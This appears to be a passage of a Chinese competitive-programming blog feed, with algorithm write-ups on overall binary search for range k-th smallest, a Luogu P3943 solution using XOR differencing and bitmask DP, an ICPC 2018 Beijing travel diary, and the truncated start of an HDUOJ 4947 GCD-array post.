<p>对于一个长度为 <span class="math inline">\(n\)</span> 的数列，现有 <span class="math inline">\(q\)</span> 次询问。每次询问给出 <span class="math inline">\(l, r, k\)</span>，试求数列中下标在 <span class="math inline">\([l, r]\)</span> 中第 <span class="math inline">\(k\)</span> 小的数的数值。</p>
<p><strong>数据范围</strong>：<span class="math inline">\(1 \le n \le 10^5, \ 1 \le q \le 5 \times 10^3\)</span></p>
<p><strong>题目链接</strong>： <a href="http://bailian.openjudge.cn/practice/2104/">POJ 2104: Kth Number</a></p>
<hr />
<p><del>主席树裸题？</del></p>
<p>如果是对于单次查询，我们显然是可以先对区间进行预处理然后进行二分的。一种显而易见的思路就是将数值离散化然后开一个数组来记录每一个值在区间内出现的次数然后对前缀和进行二分。但是，当我们面对多个询问的时候，如果对每一个询问都进行预处理然后再二分，这样的复杂度显然是无法接受的。</p>
<p>不难发现对于每个询问其实预处理的过程都是大致相同的。那么我们是否可以对多个询问同时进行二分操作呢？</p>
<p>假设题目给定了由 <span class="math inline">\(n\)</span> 个询问组成的一个询问集合 <span class="math inline">\(Q\)</span>，并且我们知道所有出现过的数值的区间为 <span class="math inline">\([l, r]\)</span>。二分过程中，我们记 <span class="math inline">\(mid = \frac{1}{2}(l+r)\)</span>。在每一层递归中，我们首先对于 <span class="math inline">\(Q\)</span> 内每一个询问进行处理，求得该询问区间中数值在 <span class="math inline">\([l, mid]\)</span> 范围内的值的个数 <span class="math inline">\(cnt\)</span>。接下来，我们以此将 <span class="math inline">\(Q\)</span> 中的询问分为两类：<span class="math inline">\(cnt \ge k\)</span> 的以及 <span class="math inline">\(cnt &lt; k\)</span> 的。我们用 <span class="math inline">\(Q_1\)</span> 和 <span class="math inline">\(Q_2\)</span> 来表示这两类询问。</p>
<p>对于 <span class="math inline">\(Q_1\)</span> 中的询问，我们显然可以在 <span class="math inline">\([l, mid]\)</span> 这一范围中求得答案。换句话说，<span class="math inline">\([l, r]\)</span> 中的第 <span class="math inline">\(k\)</span> 小即 <span class="math inline">\([l, mid]\)</span> 中的第 <span class="math inline">\(k\)</span> 小；而对于 <span class="math inline">\(Q_2\)</span> 中的询问，我们便可以得知答案坐落于 <span class="math inline">\((mid, r]\)</span> 这一范围中。显然，求 <span class="math inline">\([l, r]\)</span> 中的第 <span class="math inline">\(k\)</span> 小等价于求 <span class="math inline">\((mid, r]\)</span> 中的第 <span class="math inline">\(k - cnt\)</span> 小（我们需要剔除 <span class="math inline">\([l, mid)\)</span> 中的数）。通过这种方式，我们可以把问题 <span class="math inline">\(Q\)</span> 拆分成 <span class="math inline">\(Q_1\)</span> 和 <span class="math inline">\(Q_2\)</span> 两个子问题然后对它们进行分治并递归求解。递归结束于 <span class="math inline">\(l = r\)</span>，记此时的询问集为 <span class="math inline">\(Q&#39;\)</span>，则 <span class="math inline">\(Q&#39;\)</span> 中的所有询问的答案即为 <span class="math inline">\(r\)</span>，便可以求解问题了。</p>
<p>我们最后需要解决的问题便是如何求得 <span class="math inline">\(cnt\)</span> 了。我们可以考虑将原始数列中的数值离散化，然后用一个树状数组来维护这一信息。树状数组的第 <span class="math inline">\(i\)</span> 位表示数列中第 <span class="math inline">\(i\)</span> 位上的值是否坐落于 <span class="math inline">\([l, mid]\)</span> 范围内，因此我们只需要在树状数组上求<span class="math inline">\([L, R]\)</span> 区间的区间和便可以得知下标 <span class="math inline">\([L, R]\)</span> 间有多少个数坐落于 <span class="math inline">\([l, mid]\)</span> 范围内，即 <span class="math inline">\(cnt\)</span>。</p>
<p>具体实现时，我们可以在记录数列中每个数的原始下标后对数列按数值从小到大排序。我们可以通过二分搜索快速查找到 <span class="math inline">\(l\)</span> 的位置，接下来我们便可以轻松地对于 <span class="math inline">\([l, mid]\)</span> 中的每个值更新树状数组中的信息。再求得 <span class="math inline">\(cnt\)</span> 后我们再逐一撤销我们方才对树状数组进行的更改以为接下来递归中求 <span class="math inline">\(cnt\)</span> 做准备。需要注意的是，撤销更改时不可以直接用 <code>memset</code>，若是如此每一次预处理就与原数组长度有关而并非与当前二分区间有关了，而这会导致复杂度的变化（下面会给出详细说明）。显然，这一过程复杂度是 <span class="math inline">\(\mathcal{O}(m\log{n})\)</span> 的，其中 <span class="math inline">\(m\)</span> 是当前二分区间的长度。总的复杂度是 <span class="math inline">\(\mathcal{O}(n\log^2{n})\)</span> 级别的（下面也会给出详细说明）。</p>
<p>最后附上 <a href="https://github.com/codgician/Competitive-Programming/blob/master/POJ/2104/overall_binary_search_binary_indexed_tree.cpp">我的代码</a> 以供参考。</p>
<hr />
<p>对于复杂度，这里引用《浅谈数据结构题的几个非经典解法》一文中的相关证明：</p>
<p>定义 <span class="math inline">\(T(C, S)\)</span> 表示当前待二分区间长度为 <span class="math inline">\(C\)</span>，待二分序列长度为 <span class="math inline">\(S\)</span>，且记对于长度为 <span class="math inline">\(m\)</span> 的序列单次处理复杂度为 <span class="math inline">\(\mathcal{O}(f(m))\)</span>，则在 <span class="math inline">\(\mathcal{O}(f(n)) \ge n\)</span> 的前提下有：</p>
<p><span class="math display">\[
T(C, S) = T(\frac{C}{2}, S&#39;) + T(\frac{C}{2}, S - S&#39;) + \mathcal{O}(f(S))
\]</span></p>
<p>解得：</p>
<p><span class="math display">\[
T(C, S) \le \mathcal{O}(f(n)\log{n})
\]</span></p>
<p>而如果每一次处理的复杂度都与序列长度 <span class="math inline">\(n\)</span> 有关，则有：</p>
<p><span class="math display">\[
T(C, S) = T(\frac{C}{2}, S&#39;) + T(\frac{C}{2}, S - S&#39;) + \mathcal{O}(n)
\]</span></p>
<p>解得：</p>
<p><span class="math display">\[
T(C, S) = \mathcal{O}(nS)
\]</span></p>
<p>不难发现，这样一来实际上复杂度就变得与暴力没什么区别了……</p>
<p>那么对于这一例题中我们的做法，我们先对数值进行排序，然后在二分查找过程中我们每次直接通过二分查找来确定端点位置，其复杂的是 <span class="math inline">\(\mathcal{O(m\log{m})}\)</span> 的，其中 <span class="math inline">\(m\)</span> 为当前处理区间长度。总的复杂度即 <span class="math inline">\(\mathcal{O}((n + Q) \log{n}\log{C})\)</span>，在该题数据范围下就是 <span class="math inline">\(\mathcal{O}(n\log^2{n})\)</span> 级别的。</p>
<hr />
<p>由上面的例子，我们可以初步窥见整体二分适用的问题范围。首先最基本的是，询问的答案必须具有可二分性，并且题目允许离线算法。</p>
<p>其次，我们注意到在上例中二分时我们每一次预处理只与当前区间长度有关。这是因为其余部分对答案的贡献是固定的。具体地阐述，假设我们计算某询问区间内的第 <span class="math inline">\(k\)</span> 大时，假设该区间内数值的范围为 <span class="math inline">\([L, R]\)</span>，当我们正在二分数值区间 <span class="math inline">\([l, r]\)</span> 时，<span class="math inline">\([l, r]\)</span> 以外的数值区间（即 <span class="math inline">\([L, l)\)</span> 和 <span class="math inline">\((r, R]\)</span>）对答案的贡献是固定不变的（询问区间内数值在这些区间内的数的个数固定），因此我们没有必要去重复计算那两个区间对答案的贡献，直接加上即可。由此，贡献也应当是可加的，并且满足交换律和结合律。</p>
<p>那么，如果我们需要支持的操作不仅仅有询问，同时还要有修改呢？事实上，只要加入修改操作后我们依然能够做到二分时每一次预处理只与当前区间长度有关，我们就可以继续使用整体二分。</p>
</div>
<div id="动态区间第-k-小" class="section level3">
<h3>动态区间第 <span class="math inline">\(k\)</span> 小</h3>
<p>对于一个长度为 <span class="math inline">\(n\)</span> 的数列，现有两类共 <span class="math inline">\(q\)</span> 次操作：</p>
<ul>
<li>将第 <span class="math inline">\(i\)</span> 个数的值修改为 <span class="math inline">\(v\)</span>；</li>
<li>询问第 <span class="math inline">\(l\)</span> 个数和第 <span class="math inline">\(r\)</span> 个数之间第 <span class="math inline">\(k\)</span> 小的数值。</li>
</ul>
<p><strong>数据范围</strong>：<span class="math inline">\(1 \le n \le 5 \times 10^4, \ 1 \le q \le 10^4\)</span></p>
<p><strong>题目链接</strong>： <a href="https://zoj.pintia.cn/problem-sets/91827364500/problems/91827365611">ZJU 2112: Dynamic Rankings</a></p>
<hr />
<p>本题与上一例唯一的区别便在于新加入了修改操作，这样一来上例中的询问集 <span class="math inline">\(Q\)</span> 在本题中就变成可以含有询问即修改两种操作的操作集了。我们不妨把每个修改操作拆成两步：先删除该位置上原值，再在该位置上插入新值。同时，序列的初始化也可看作 <span class="math inline">\(n\)</span> 次在位置 <span class="math inline">\(i\)</span> 插入新值。</p>
<p>我们注意到每一次修改操作其实对答案的贡献是独立的。具体地说，假设二分过程中当前某区间值域为 <span class="math inline">\([L, R]\)</span>，当前二分区间为 <span class="math inline">\([l, r]\)</span>。我们若是将该区间内某位置上的值由 <span class="math inline">\(a_i\)</span> 改变为 <span class="math inline">\(a_i&#39; \ (l \le a_i&#39; \le r)\)</span> ，并不会改变 <span class="math inline">\([l, r]\)</span> 以外的区间（即 <span class="math inline">\([L, l)\)</span> 和 <span class="math inline">\((r, R]\)</span> 这两个区间对答案的贡献。 由此，每一次预处理的复杂度依然仅仅是与当前二分区间有关的，可以使用整体二分。</p>
<p>故我们依然采用与上例类似的思路对所有操作进行二分。不同之处在于，由于修改这一操作的引入，我们不能随意改变操作的顺序。因此，区别仅仅在于求 <span class="math inline">\(cnt\)</span> 这一过程的实现。我们不能再像之前一样先对值排序然后二分，因为那样会改变操作的顺序。对于 <span class="math inline">\(Q\)</span> 内的操作，我们必须按照原顺序进行遍历，查询和修改同时进行（若操作为修改，只应用值在 <span class="math inline">\([l, mid]\)</span> 区间之内的）。另外在将 <span class="math inline">\(Q\)</span> 分类为 <span class="math inline">\(Q_1\)</span> 和 <span class="math inline">\(Q_2\)</span> 时也要单独开两个单独的空间来进行分类以防止改变操作之间的顺序。</p>
<p>最后附上 <a href="https://github.com/codgician/Competitive-Programming/blob/master/ZOJ/2112/overall_binary_search_edit_binary_indexed_tree.cpp">我的代码</a> 以供参考。</p>
</div>
</div>
</div>
<div id="section" class="section level1">
<h1>%%%</h1>
<ul>
<li>Thesis2013 - <a href="https://github.com/enkerewpo/OI-Public-Library/raw/master/%E5%9B%BD%E5%86%85%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/Thesis2013-%E6%B5%85%E8%B0%88%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E9%A2%98%E7%9A%84%E5%87%A0%E4%B8%AA%E9%9D%9E%E7%BB%8F%E5%85%B8%E8%A7%A3%E6%B3%95.pdf">浅谈数据结构题的几个非经典解法</a></li>
<li>李煜东 - 《算法竞赛进阶指南（第二版）》</li>
<li>OI Wiki - <a href="https://oi-wiki.org/misc/cdq-divide">CDQ分治 - OI Wiki</a></li>
<li>wu_tongtong - <a href="https://blog.csdn.net/wu_tongtong/article/details/78823783">整体二分（二分进阶）</a></li>
</ul>
</div>
]]></content>
		</item>
		
		<item>
			<title>Luogu P3943: 星空</title>
			<link>https://codgician.me/zh-hans/posts/2019/02/luogu-p3943/</link>
			<pubDate>Tue, 05 Feb 2019 11:20:57 +0800</pubDate>
			
			<guid>https://codgician.me/zh-hans/posts/2019/02/luogu-p3943/</guid>
			<description>题面 现有一个长度为 $n$ 的灯泡序列，其中 $k$ 个位置上的灯泡是熄灭的，其余的是点亮的。我们可以进行 $m$ 种操作，而第 $i$ 种操作是选定任意长度为 $b_i$ 的连续灯泡</description>
			<content type="html"><![CDATA[<h1 id="题面">题面</h1>
<p>现有一个长度为 $n$ 的灯泡序列，其中 $k$ 个位置上的灯泡是熄灭的，其余的是点亮的。我们可以进行 $m$ 种操作，而第 $i$ 种操作是选定任意长度为 $b_i$ 的连续灯泡区间，对这个区间内所有灯泡的状态都进行一次翻转（亮变灭，灭变亮）。试求最少需要几次操作就可以让所有灯泡都被点亮。</p>
<p><strong>数据范围</strong>：$1 \le n, b_i \le 4 \times 10^4, \ 1 \le m \le 64, \ 1 \le k \le 8$</p>
<p><strong>题目链接</strong>：<a href="https://www.luogu.com.cn/problemnew/show/P3943">Luogu P3943: 星空</a></p>
<h1 id="分析">分析</h1>
<h2 id="差分思想">差分思想</h2>
<p>首先一个非常优雅的想法就是利用差分将区间操作变换为单点操作。不过这里我们面对的是一个 $01$ 序列，我们可以把普通的前缀和改成异或前缀和。严格地说，记 $a$ 代表原 $01$ 序列，$d$ 是原序列的异或差分数组。那么它们之间存在如下关系：</p>
<p>$$
a_i = b_0 \oplus b_1 \oplus \dots \oplus b_i
$$</p>
<p>这样翻转 $a$ 中的 $[l, r]$ 区间就等价于在 $b$ 中翻转 $l$ 和 $r + 1$ 两个位置，于是 $a$ 中的区间操作就转换为了 $d$ 中的单点操作（注意 $d$ 的长度是 $n + 1$）。</p>
<p>由此原问题被转换为这样一个新问题：给定一个 $01$ 序列 $d$，一次只能选择两个位置上的值（这两个位置间隔的距离是题面给出的 $m$ 种）并对其进行翻转，试问最少翻转多少次可以将序列翻转成目标序列？</p>
<hr>
<p>我们不妨记灯亮为 $0$，灯暗为 $1$。这样的方便之处在于所有灯全亮时 $a$ 为全 $0$，而其对应的 $d$ 前 $n$ 个位置也为全 $0$。至于 $d$ 中的第 $n + 1$ 个位置，不论其为 $0$ 还是 $1$ 都不会对 $a$ 产生任何影响，因此第 $n + 1$ 位可以是任意值。</p>
<p>需要注意的是，题目给出了 $a$ 中 $1$ 的个数 $k \le 8$，这一限制对应到差分数组 $d$ 中会是怎样呢？如果我们要让 $d$ 为 $111111\dots$，那么 $a$ 的形式即如 $101010\dots$。不难发现若 $a$ 中最多有 $k$ 个 $1$，则 $d$ 中最多有 $2k$ 个 $1$。</p>
<h2 id="完全背包">完全背包</h2>
<p>我们继续考虑转换后的问题。为了最小化反转次数我们显然不会选择两个 $0$ 进行翻转，因为这样只会使得 $1$ 的个数增多。那么我们可以选择：</p>
<ul>
<li>选中两个 $1$，那么翻转后两个位置上的值都会变为 $0$；</li>
<li>选择一个 $0$ 和一个 $1$，那么这次操作后 $1$ 的个数并不会变化，其效果等效于将选中的两个位置上的值交换位置。进一步说，如果记两个位置间的距离为 $\Delta{x}$，则我们可以认为是 $1$ 向左或是向右移动了 $\Delta{x}$。</li>
</ul>
<p>那么问题进一步转换为：给定一个 $01$ 序列，对于序列中每个 $1$，每一步可以向前或向后走 $k$ 种距离，如果走到的位置上也是 $1$ 则两者相消为 $0$，问最少需要多少步可以使得所有位置都变为 $0$？</p>
<hr>
<p>考虑某一对 $1$ 之间的距离为 $\Delta{x}$，若要将这对 $1$ 相消，就需要左右两端的 $1$ 分别向左和向右移动到同一位置上。我们不妨把 $\Delta{x}$ 看作背包容量，每种可能的步数看作背包里的物品（每种步数 $v$ 要拆成 $+v$ 和 $-v$ 两个物品，因为既可以往左走又可以往右走），那么我们 $\mathcal{O}(nm)$ 跑一个完全背包就可以得到消去每一对 $1$ 所需要的最小步数。</p>
<h2 id="一般图的最大匹配">一般图的最大匹配</h2>
<p>在得到了消去每一对 $1$ 所需要的最小步数后 $w$，我们可以考虑在这两个点间建立一条价值为 $w$ 的无向边。这样一来，问题就转变为了一般图的最大匹配问题…… 大佬们可以使用带花树算法用 $\mathcal{O}(k^3)$ 级别复杂度解决之…… 当然这道题数据范围很小，所以我们也可以使用状压 DP 来解决。</p>
<p>最后还有一个细节，前面说了 $d$ 中第 $n + 1$ 位可以是任意值，因此如果考虑这一位会带来一些不便。我们可以这样处理：如果位置 $i$ 经过若干步可以到达第 $n + 1$ 位，我们就从 $i$ 向自己连一条边。其意义为 $i$ 可以与自己进行匹配。这样子就可以完全去掉第 $n + 1$ 位从而简化模型。</p>
<p>为了减小状态数量，我们不妨只考虑所有 $1$ 点。这样一来，初始状态用二进制表示就是 $11\dots1$，而目标状态即为 $00\dots0$。另外一个常见的优化是，我们不必用 $\mathcal{O}(k^2)$ 的复杂度去枚举每一个点对（那样会造成大量重复运算）。我们可以每次选取最左的 $1$ 点作为点对的一个点，然后 $\mathcal{O}(k)$ 枚举另一个点直接进行转移即可。这样子其实是可以遍历到所有状态的（反正目标状态中这个 $1$ 迟早要消去，这样转移的意义就是按顺序依次消去 $1$）。因此状压 DP 的复杂度为 $\mathcal{O}(k \cdot 2^k)$。</p>
<p>如果最后一部分采用状压 DP 实现，那么总的复杂度为 $\mathcal{O}(nm + k \cdot 2^k)$。如果能用带花树大概可以有 $\mathcal{O}(nm + k^3)$ 的复杂度，可惜我不会。最后附上 <a href="https://github.com/codgician/Competitive-Programming/blob/master/Luogu/P3943/dp_state_compression.cpp">我的代码</a> 以供参考。</p>
<h1 id="heading">%%%</h1>
<ul>
<li>fstqwq 杨爷太强了 %%%</li>
</ul>
]]></content>
		</item>
		
		<item>
			<title>ICPC 2018 亚洲区域赛北京站游记</title>
			<link>https://codgician.me/zh-hans/posts/2018/11/icpc-2018-asia-beijing-regional-travel-notes/</link>
			<pubDate>Mon, 26 Nov 2018 22:58:00 +0800</pubDate>
			
			<guid>https://codgician.me/zh-hans/posts/2018/11/icpc-2018-asia-beijing-regional-travel-notes/</guid>
			<description>Day 0 早早地到达了高铁站…… 北京之行时长竟然有 $4$ 天，真是令人感到舒适…… 前面几天一直在瞎搞各种线段树，包括什么势能线段树 (aka 吉司机线段树)、多 tag</description>
			<content type="html"><![CDATA[<h1 id="day-0">Day 0</h1>
<p>早早地到达了高铁站…… 北京之行时长竟然有 $4$ 天，真是令人感到舒适……</p>
<p>前面几天一直在瞎搞各种线段树，包括什么势能线段树 (aka 吉司机线段树)、多 tag 线段树…… 于是在高铁上首先试着补了一补之前一直欠着没来得及做的多 tag 线段树的题…… 狂 WA…… 遂放弃。</p>
<p>一路经过了南京、徐州，最后终于到达了北京（滑稽）。到达北京后坐了四十分钟地铁终于到达了 PKU 附近。看到宾馆的大门我不禁联想到了湘潭之旅，但是进房间里后感觉房间里面还挺精致的。北京的宾馆真的好贵好贵 QAQ。</p>
<p>秋天的银杏很美……</p>
<p><img src="/posts/life/icpc-2018-asia-beijing-regional-travel-notes/first_glimpse.jpg" alt="初见北大"></p>
<p>放好东西后前往 PKU 签到，路上路过了庆丰包子铺（滑稽）。宾馆离比赛场地挺近的，签到时还顺便附赠了带有 PKU 和 ICPC 的北大红三口数据线，体验极佳！另外衣服也挺好看的 QwQ，就是白色不耐脏 QAQ。</p>
<p>晚上本来只是想问问高中同学 Harry 农园食堂和艺园食堂哪里好吃一点…… 没想到他超级热情像第二天请我吃饭。瞬间感到不好意思。Harry 推荐了农园二楼，然而北大发的饭卡不能在农园二楼用只能在农园一楼用。我费尽心机尽量凑够了 $20$ 元，结账时却被告知超额了…… 有手续费？卡里面实际只有 $16.1$ 软妹币？这是什么操作 orz。后来才听说貌似是北大内部有人去贩卖多余的饭卡被发现了所以给大家都降额了…… 也是醉了。</p>
<p>吃完晚饭后一行人 “夜袭北大”。我顺便试了试 Google Camera 新的 Night Sight 的拍照效果（然而我并买不起 Pixel 所以只好用 port 过来的 Google Camera&hellip; QAQ)：</p>
<p><img src="/posts/life/icpc-2018-asia-beijing-regional-travel-notes/lake_and_tower.jpg" alt="一湖一塔"></p>
<p>拍摄了著名的的 “一湖一塔”。Google Camera 的 Night Shift 还是需要长时间曝光，而我又比较手抖，所以远看挺不错细看全是糊 QAQ。</p>
<p>回到宾馆后继续瞎搞了一番那道多 tag 线段树的题…… 果然又是 <code>pushDown</code> 写挂了。瞎改了一个不起眼的地方竟然就 A 了。Hanano 研究了一下饭卡后表示每张饭卡上的雕花都不一样（一共有 $64$ 个孔位），很可能饭卡就是一张普通的纸，然后读取饭卡的机器里面就是一个光源，通过开孔的排列来得到卡的序列号，而实际金额数据实际上都是被存储在远端服务器上的。听罢我顺觉很有道理，dalao 太强了orz，也不禁赞叹这一使得饭卡富有艺术感同时又能极大节约成本并方便管理的设计。所以是不是我在拿大头针再多扎几个孔就又是一条好汉了？（逃</p>
<p>最后貌似睡得并不早…… 但还好睡得还算好。</p>
<h1 id="day-1">Day 1</h1>
<p>上午一个人溜到北大去跟 Harry 巨佬溜达去了。Harry 带我逛了北大校园，又一次感到这才是大学，然后感觉自己读了个假大学（常规操作）。另外北大校史馆的牌子竟然是长者题字，$+1s$。中午和 Harry 一起吃了农园二楼的麻辣香锅，十分好吃。虽然比不上四川的冒菜或是干锅，但是我在杭州根本没找到如此具有家乡风格的菜 QAQ。再次感谢 Harry 巨佬orz。另外从 Harry 那里听说了北大图灵班的巨佬事迹，瑟瑟发抖。真希望自己有朝一日也能去波士顿看白鸽。</p>
<p>附上一张 PKU 校门图~</p>
<p><img src="/posts/life/icpc-2018-asia-beijing-regional-travel-notes/pku.jpg" alt="PKU 校门"></p>
<p>吃完饭后直接去体育馆等队友。一直在外面等的我没想到队友早就进看台了。一进看台没找到队友，而队友疯狂使用坐标定位法告诉我他们的坐标，然而本垃圾连 $x, y$ 轴是什么都不知道…… 最后还是使用 Hanano 巨佬教授的 cen 神定位法找到了队友 orz。</p>
<p>北大的体育馆好大好热…… 看 ACM 养老群里说竟然还有地热…… 这很北大。</p>
<p><img src="/posts/life/icpc-2018-asia-beijing-regional-travel-notes/khoo_teck_puat_gymnasium.jpg" alt="比赛场地"></p>
<p>北大发的气球竟然是那种可以飘起来的气球~ 里面充的大概是氦气和空气的混合气体？</p>
<p>热身赛听说是把近几年来北京区域赛的签到题混在了一起…… 然而本蒟蒻一场都没做过…… QAQ。后面的队伍早早 AK，都开始愉快地聊天划水了，而我们却还在各种卡题。我们很快就全部四道题的思路全部口胡出来了。Hanano 开了 A 题然而交了后 TLE 了…… 本垃圾开了 B 题 —— 一道一看就很傻逼的模拟题，然而随便一写一发入魂 TLE。什么？$1000$ 的数据范围 $\mathcal{O}(n\log{n})$ 还可以 TLE 的？调了半天还是 TLE，于是便打印了代码。在研究打印出来代码后发现有一处弹出优先队列的时候没有判空…… 但转念一想这应该 RE 而不是 TLE，一度怀疑算法错了。等到最后 nbfynbfy 大佬把 C 题成功 AC 掉避免集体爆零后，我不抱希望地把 B 题没判空的地方判了，交上去竟然 Accepted 了？黑人问号.jpg。拿小本本记下 hihoCoder 非法操作 STL 不会 RE 而会 TLE&hellip; QAQ （这貌似预示了第二天本垃圾会狂演队友？）</p>
<p>Hanano 的 A 题还在超时，我一看数据不大就建议 Hanano 本地打表并且交表。表倒是打出来了…… 不过交上去后代码死于 Waiting&hellip; 大概是裁判一看我们好菜签到题竟然都打表就把我们的代码 Skip 掉了 QAQ。最后我终于注意到数据组数 $T$ 恰好跟数据范围大小一致，立马意识到后台数据肯定就是把所有的值都询问了一遍…… 我立马意识到不应该正着搜索，而应该从最终状态开始倒着搜索与处理出所有的答案记录下来然后 $\mathcal{O}(1)$ 解决询问…… 然而时间不够了，放弃。</p>
<p>最后抱着两个气球回宾馆了。任凭一只绿油油的气球独自在天花板上开心玩耍：</p>
<p><img src="/posts/life/icpc-2018-asia-beijing-regional-travel-notes/the_balloon_flies.jpg" alt="天花板上的气球"></p>
<h1 id="day-2">Day 2</h1>
<p>一大早起来发现昨天还好好待在天花板上的气球失去了梦想……</p>
<p><img src="/posts/life/icpc-2018-asia-beijing-regional-travel-notes/the_balloon_loses_hope.jpg" alt="失去梦想的气球"></p>
<p>看起来今天多半是要自闭……</p>
<p>比赛开始前 Hanano 看志愿者打气球，发现 F 题气球很多的，就说可能是签到题（一口好奶）。于是开场后我先看 F 题。nbfynbfy 巨佬很快解决了 A 题并且 1A %%%。而与此同时，研究线段树走火入魔的我却无可救药地被 F 题吸引了（后来事实证明这是全场最难的题之一）。我疯狂往势能减小线段树方向去考虑…… 但发现对于区间异或操作我很难准确维护区间最大值和区间最小值…… 最后不得已放弃。我去看了看 B 题…… 什么这么大一道傻逼模拟题竟然没什么人过？我要上！然后很快写完后…… Wrong Answer。有点自闭，因为知道过的人很少我还专门自己造了几组样例测试了一下都没有问题。然后发现了一个小问题…… 改了改…… 又一发 Wrong Answer。我仔细阅读了一下题突然感觉题目可能有些歧义？于是就在 Clarification 里面问了一下，结果得到了一个 No Response。心态大崩，又是决定试一试另外一种理解，又 WA 了两发。在此期间 Hanano 和 nbfynbfy 大佬在疯狂讨论 D 题，几乎已经出解了。于是我只好打印代码并且把机位让给了他们。心态有点崩。</p>
<p>我仔细分析后认为我刚开始理解的提题意应该是正确的。于是在 nbfynbfy 成功 A 掉 D 题后我又腆着脸上去了…… 自己测了几组样例后偶然意识到处理前导 $0$ 的时候搞忘判 $0$ 了…… 头脑一热交一发，仍然 Wrong Answer。 心态巨崩，一度不敢交题。在本地自己造了很多组样例后终于发现了一个涉及换行的大问题…… 然而在此期间另外两位巨佬 I 题也搞出来了，于是我打印了我的代码并且让他们先上机。他们很快就把 I 题 A 掉了（被队友带飞 QAQ）。在他们写 I 题的时候我在纸上重构了我 B 题的代码并且在他们下机后立马重写了 B 题的代码，测了很多样例没问题后忐忑地交上去…… 终于 Accepted 了。长吁一口气，发现 Ranklist 我们队 B 题地下华丽丽地出现了 +7。对不起队友，捂脸 QAQ。</p>
<p>此时竟然离封榜就已经只剩不到半小时了。看榜的时候发现我们竟然在银牌区！于是我们决定最后一小时合力攻 H 题。我们很快确定了这是一道 DP，但是很遗憾的是我们直到最后也没有能够搞出来 QAQ。</p>
<p><img src="/posts/life/icpc-2018-asia-beijing-regional-travel-notes/four_balloons.jpg" alt="四只气球"></p>
<p>比赛结束后立马就是游戏对抗赛（Botzone 上的坦克大战）。前期多场平局让我们意识到不仅人是复读机，坦克也是。</p>
<p>经过各种冗长的发言后最终来到了颁奖环节。我一直在狂奶搞不好是铜首（羞愧），感觉把队友演了。但是心里一想前面有很多北大打星队说不定运气好还能搞个银尾。在滚榜环节我各种瞎奶 “这个肯定 A 了”、“封榜后只交了一次肯定代表 A 了”、“封榜后交了那么多次一定 A 了”，多数都被打脸。亲自滚榜的黄教授也被疯狂打脸 233333。一直滚到前 $50$ 的时候都没出现我们队，我心里顿觉充满希望。然而好景不长…… 在 $47$ 名的位置我们出现了…… 然后铜牌线华丽丽地划在了 $46$ 上方。 What？ 铜牌第二？QAQ！凉了，我把队友演了。要是少交一点点罚时肯定就银了啊 QAAAQ！其实，虽然自己在来北京前对拿牌并没有抱太大希望，但是最后知道这一结果后心里却又有一点点小难过…… 人们总是遗憾于自己本可以做到却只是差一点点没能做到的事情 QAQ。</p>
<p><a href="https://web.archive.org/web/20181112004553/http://icpc.hihocoder.com/">ICPC 2018 亚洲区预赛北京站 终榜</a></p>
<p>感觉要被队友打死。</p>
<p>面无表情地上台领 (bei) 牌 (guo)。<strong>反思自己的确是平时太不注重罚时，这也算是给自己一次深刻的教训</strong>。</p>
<p>出体育馆后上了商汤的车，前往商汤科技总部骗吃骗喝。提问环节抽锦鲤第二轮就抽中了 Hanano 大佬（超强）23333。清北的那几位大佬都好强啊orz。商汤提供的自助餐有各种 Pizza、烤鸡、炸鸡、汉堡、寿司、培根、慕斯蛋糕、布丁、水果拼盘…… 甚至还有 Rio 喝。真是十分丰盛。在听完宣讲后出来还发现多了 KFC，于是当场 “吃不了，兜着走” 顺了一个汉堡（捂脸）。</p>
<p>在商汤海吃一顿后心情好了些，回宾馆后随便看了看南方公园消遣了一番就睡觉了。</p>
<h1 id="day-3">Day 3</h1>
<p>早上返程…… 再一次经过了徐州、南京，然后就滚回学校了。心里一想之前签过假条顺势就把晚上的课一并翘了。听说概率论半期考试很简单没去考感觉血亏 QAQ。今年的比赛到此就算结束了，打算再抽个时间写一篇认真的总结，但是感觉自己多半会咕……（我期末不想挂科 QAQ）。</p>
]]></content>
		</item>
		
		<item>
			<title>HDUOJ 4947: GCD Array</title>
			<link>https://codgician.me/zh-hans/posts/2018/11/hduoj-4947/</link>
			<pubDate>Sat, 24 Nov 2018 23:52:32 +0800</pubDate>
			
			<guid>https://codgician.me/zh-hans/posts/2018/11/hduoj-4947/</guid>
			<description>题面 分析 %%% 题面 对于长度为 \(l\) 且初始全为 \(0\) 的序列 \(a\)（下标 \(1 \sim l\)），有 \(q\) 次操作。操作分为两种： 给定 \(n, d, v\)，对于每个满足 \(\gcd(x, n) = d\) 的 \</description>
			<content type="html"><![CDATA[
<script src="/rmarkdown-libs/header-attrs/header-attrs.js"></script>

<div id="TOC">
<ul>
<li><a href="#题面">题面</a></li>
<li><a href="#分析">分析</a></li>
<li><a href="#section">%%%</a></li>
</ul>
</div>

<div id="题面" class="section level1">
<h1>题面</h1>
<p>对于长度为 <span class="math inline">\(l\)</span> 且初始全为 <span class="math inline">\(0\)</span> 的序列 <span class="math inline">\(a\)</span>（下标 <span class="math inline">\(1 \sim l\)</span>），有 <span class="math inline">\(q\)</span> 次操作。操作分为两种：</p>
<ol style="list-style-type: decimal">
<li>给定 <span class="math inline">\(n, d, v\)</span>，对于每个满足 <span class="math inline">\(\gcd(x, n) = d\)</span> 的 <span class="math inline">\(x\)</span>，为 <span class="math inline">\(a_x\)</span> 加上 <span class="math inline">\(v\)</span>；</li>
<li>给定 <span class="math inline">\(x\)</span>，询问 <span class="math inline">\(\sum\limits_{i = 1}^{x} a_i\)</span>。</li>
</ol>
<p><strong>数据范围</strong>：<span class="math inline">\(1 \le l, q \le 5 \times 10^4, \ 1 \le n, d, v \le 2 \times 10^5, \ 1 \le x \le l\)</span></p>
<p><strong>题目链接</strong>：<a href="http://acm.hdu.edu.cn/showproblem.php?pid=4947">HDUOJ 4947: GCD Array</a></p>
</div>
<div id="分析" class="section level1">
<h1>分析</h1>
<p>对于操作 <span class="math inline">\(1\)</span>，如果 <span class="math inline">\(d \nmid n\)</span>，则显然不可能满足 <span class="math inline">\(\gcd(x, n) = d\)</span>。对于这样的情况我们忽略即可。</p>
<p>我们记 <span class="math inline">\(\Delta{a}(x)\)</span> 代表某次进行第一种操作时位置 <span class="math inline">\(x\)</span> 上值的增量，有：</p>
<p><span class="math display">\[
\begin{aligned}
\Delta{a}(x) = &amp; v \cdot [\gcd(x, n) = d] \\
